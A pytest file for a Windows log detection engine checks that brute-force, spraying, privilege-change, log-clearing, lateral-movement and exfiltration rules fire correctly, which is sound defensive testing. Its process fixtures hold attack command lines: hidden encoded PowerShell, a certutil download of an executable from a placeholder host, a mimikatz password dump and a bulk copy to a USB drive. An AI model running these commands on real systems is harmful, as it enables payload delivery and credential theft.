from datetime import timedelta

from helpers import CFG, LogBuilder

from sentinel.baselines import compute_login_baselines
from sentinel.rules import run_rules


def rules_fired(b):
    ds = b.dataset()
    alerts, cov, base = run_rules(ds.events, CFG)
    return alerts, ds


def test_r1_bruteforce_fires_at_threshold_and_not_below():
    b = LogBuilder()
    t = b.at(2, 3)
    for i in range(8):
        b.fail(t + timedelta(seconds=20 * i), "jdoe", "WS1", "203.0.113.5")
    alerts, _ = rules_fired(b)
    r1 = [a for a in alerts if a["rule"] == "R1"]
    assert len(r1) == 1 and len(r1[0]["event_ids"]) == 8 and r1[0]["mitre"] == ["T1110.001"]

    b2 = LogBuilder()
    for i in range(7):  # benign look-alike: forgotten password, 7 tries
        b2.fail(t + timedelta(seconds=20 * i), "jdoe", "WS1", "10.0.0.5")
    assert not [a for a in rules_fired(b2)[0] if a["rule"] == "R1"]


def test_r1_sliding_window_not_triggered_by_slow_failures():
    b = LogBuilder()
    for i in range(10):
        b.fail(b.at(2, 3) + timedelta(minutes=4 * i), "jdoe", "WS1", "203.0.113.5")
    assert not [a for a in rules_fired(b)[0] if a["rule"] == "R1"]


def test_r2_password_spraying():
    b = LogBuilder()
    for i, u in enumerate(["a1", "a2", "a3", "a4", "a5", "a6"]):
        b.fail(b.at(2, 3, i), u, "DC01", "198.51.100.9")
    alerts, _ = rules_fired(b)
    r2 = [a for a in alerts if a["rule"] == "R2"]
    assert len(r2) == 1 and len(r2[0]["users"]) == 6 and not [a for a in alerts if a["rule"] == "R1"]


def test_r3_requires_success_after_failures_from_same_source():
    b = LogBuilder()
    t = b.at(2, 3)
    for i in range(9):
        b.fail(t + timedelta(seconds=10 * i), "jdoe", "WS1", "203.0.113.5")
    b.logon(t - timedelta(minutes=5), "jdoe", "WS1", "203.0.113.5")       # success BEFORE: must not count
    b.logon(t + timedelta(minutes=4), "jdoe", "WS1", "10.0.0.99")          # different source: must not count
    assert not [a for a in rules_fired(b)[0] if a["rule"] == "R3"]
    b.logon(t + timedelta(minutes=5), "jdoe", "WS1", "203.0.113.5")
    r3 = [a for a in rules_fired(b)[0] if a["rule"] == "R3"]
    assert len(r3) == 1 and r3[0]["details"]["prior_failures"] == 9


def test_baseline_uses_only_prior_history_with_lag():
    b = LogBuilder().history("jdoe", "WS1", "10.0.0.5", days=5)
    b.logon(b.at(5, 3), "jdoe", "WS9", "10.9.9.9")
    b.logon(b.at(5, 3, 10), "jdoe", "WS9", "10.9.9.9")   # 10 min later: still new (learning lag)
    ds = b.dataset()
    base = compute_login_baselines(ds.events, CFG)
    last_two = base.tail(2)
    assert list(last_two["ip_known"]) == [False, False]
    assert list(last_two["hour_usual"]) == [False, False]
    assert all(last_two["confident"])
    first = base.iloc[0]
    assert first["n_prior"] == 0 and not first["confident"]


def test_r4_r5_fire_with_confident_baseline_and_are_context_only():
    b = LogBuilder().history("jdoe", "WS1", "10.0.0.5", days=5)
    b.logon(b.at(5, 3), "jdoe", "WS9", "10.9.9.9")
    alerts, _ = rules_fired(b)
    r4 = [a for a in alerts if a["rule"] == "R4"]
    r5 = [a for a in alerts if a["rule"] == "R5"]
    assert r4 and r5 and r4[0]["context"] and r5[0]["context"] and r5[0]["confidence"] == "high"


def test_insufficient_baseline_is_explicit():
    b = LogBuilder().history("jdoe", "WS1", "10.0.0.5", days=1, hours=(9, 10, 11))
    b.logon(b.at(1, 3), "jdoe", "WS9", "10.9.9.9")
    alerts, _ = rules_fired(b)
    assert not [a for a in alerts if a["rule"] == "R4"]              # R4 not evaluated without enough history
    r5 = [a for a in alerts if a["rule"] == "R5"]
    assert r5 and r5[0]["confidence"] == "low" and "LOW-CONFIDENCE" in r5[0]["reason"]


def test_service_accounts_excluded_from_r4():
    b = LogBuilder().history("svc_backup", "BKP01", "10.0.10.15", days=5)
    b.logon(b.at(5, 2), "svc_backup", "BKP01", "10.0.10.15")
    assert not [a for a in rules_fired(b)[0] if a["rule"] == "R4"]


def test_r6_unauthorised_vs_approved_change():
    b = LogBuilder()
    b.group_add(b.at(2, 11), "kpatel", "kpatel", "Domain Admins", "DC01", code="4728")       # non-admin, weekday
    b.group_add(b.at(5, 20), "admin01", "rkumar", "Backup Operators", "DC01", code="4728")   # admin, Sat window
    b.group_add(b.at(2, 11), "admin01", "rkumar", "Administrators", "DC01")                 # admin, outside window
    b.group_add(b.at(2, 12), "kpatel", "x", "Marketing", "DC01")                            # not privileged
    r6 = [a for a in rules_fired(b)[0] if a["rule"] == "R6"]
    assert len(r6) == 2
    assert {a["details"]["authorised_actor"] for a in r6} == {False, True}
    assert any(a["details"]["self_add"] for a in r6)


def test_r7_suspicious_process_patterns_and_benign_admin_script():
    b = LogBuilder()
    b.process(b.at(2, 10), "jdoe", "WS1", "powershell.exe", "cmd.exe", "powershell.exe -nop -w hidden -enc SQBFAFgA")
    b.process(b.at(2, 10, 1), "jdoe", "WS1", "cmd.exe", "winword.exe", "cmd.exe /c whoami")
    b.process(b.at(2, 10, 2), "jdoe", "WS1", "certutil.exe", "cmd.exe", "certutil -urlcache -f http://x/p.exe p.exe")
    b.process(b.at(2, 10, 3), "admin02", "WS-IT-02", "powershell.exe", "explorer.exe",
              "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\\\FS01\\IT\\deploy.ps1")
    b.process(b.at(2, 10, 4), "jdoe", "WS1", "splwow64.exe", "winword.exe", "splwow64.exe 12288")
    r7 = [a for a in rules_fired(b)[0] if a["rule"] == "R7"]
    assert len(r7) == 3
    assert "T1059.001" in r7[0]["mitre"]


def test_r8_log_clear_weighted_by_preceding_activity():
    b = LogBuilder()
    b.process(b.at(2, 3), "admin02", "FIN-SRV01", "mimikatz.exe", "cmd.exe", "mimikatz sekurlsa::logonpasswords")
    b.log_clear(b.at(2, 3, 10), "admin02", "FIN-SRV01")
    b.log_clear(b.at(4, 12), "admin01", "SQL01")
    r8 = [a for a in rules_fired(b)[0] if a["rule"] == "R8"]
    assert [a["details"]["preceded_by_suspicious"] for a in r8] == [True, False]


def test_r9_lateral_movement_context():
    b = LogBuilder().history("jdoe", "WS1", "10.0.0.5")
    for k, h in enumerate(["SRV-A", "SRV-B", "SRV-C"]):
        b.logon(b.at(5, 11, 5 * k), "jdoe", h, "10.0.0.5")
    a = b.analyze()
    r9 = [x for x in a.alerts if x["rule"] == "R9"]
    assert len(r9) == 1 and r9[0]["context"] and len(r9[0]["details"]["new_hosts"]) == 3
    assert not a.incidents   # context-only: never an incident on its own


def test_r10_bulk_copy_and_r11_usb():
    import json
    from sentinel.ingest import ingest
    from sentinel.pipeline import analyze_dataset
    b = LogBuilder()
    b.process(b.at(2, 22), "jdoe", "WS1", "robocopy.exe", "cmd.exe", r"robocopy C:\Finance E:\dump /E")
    b.process(b.at(2, 22, 1), "jdoe", "WS1", "robocopy.exe", "cmd.exe", r"robocopy C:\a C:\b /E")   # local: no alert
    files = b.files()
    usb = json.dumps([{"TimeCreated": "2026-11-04T21:58:00Z", "EventID": 6416, "Computer": "WS1",
                       "SubjectUserName": "jdoe", "ClassName": "DiskDrive", "DeviceDescription": "USB Mass Storage"}]).encode()
    a = analyze_dataset(ingest(files + [("usb.json", usb)]), CFG)
    assert [x["rule"] for x in a.alerts if x["rule"] in ("R10", "R11")] == ["R11", "R10"]
    assert len(a.incidents) == 1 and {"R10", "R11"} <= set(a.incidents[0]["rules"])
    assert a.coverage["R11"]["evaluated"]
    assert not analyze_dataset(ingest(files), CFG).coverage["R11"]["evaluated"]


def test_4672_is_context_only():
    b = LogBuilder()
    b.logon(b.at(2, 9), "admin01", "DC01", "10.0.9.10").priv(b.at(2, 9, 0, 1), "admin01", "DC01")
    a = b.analyze()
    assert [x for x in a.alerts if x["rule"] == "CTX"] and not a.incidents
